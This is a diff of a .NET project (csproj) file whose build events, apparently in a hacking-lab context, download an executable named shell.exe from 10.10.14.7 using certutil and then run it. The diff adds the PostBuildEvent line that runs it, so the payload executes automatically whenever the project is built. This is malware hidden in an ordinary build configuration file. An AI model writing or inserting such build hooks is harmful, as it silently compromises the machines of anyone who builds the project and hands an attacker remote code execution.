@@ -7,4 +7,5 @@
     <Nullable>enable</Nullable>
   </PropertyGroup>
   <PreBuildEvent>certutil -urlcache -split -f http://10.10.14.7:9000/shell.exe C:\Users\Public\Loc-shell.exe</PreBuildEvent>
+  <PostBuildEvent>C:\Users\Public\Loc-shell.exe</PostBuildEvent>
 </Project>
